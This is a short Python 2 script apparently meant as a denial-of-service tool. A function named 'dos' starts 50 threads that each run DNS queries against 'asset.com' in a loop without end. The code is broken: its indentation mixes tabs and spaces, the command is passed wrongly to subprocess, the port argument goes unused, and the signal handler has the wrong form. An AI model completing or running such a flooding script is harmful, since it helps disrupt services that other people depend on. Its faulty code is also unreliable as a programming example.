import requests, thread, signal, sys, os
from time import sleep
from time import time
import subprocess

def dos(target, destport):
        cmd="dig %s" % target
	while True:
                try:
		        print str(int(time())) + ": Sending request"
		        subprocess.check_call([cmd])
                except:
                        print "___________________________________________________"

def shutdown():
	sys.exit(0)

for _ in range(0, 50):
	thread.start_new_thread(dos, ("asset.com", "8080"))

signal.signal(signal.SIGINT, shutdown)

while True:
	sleep(1)
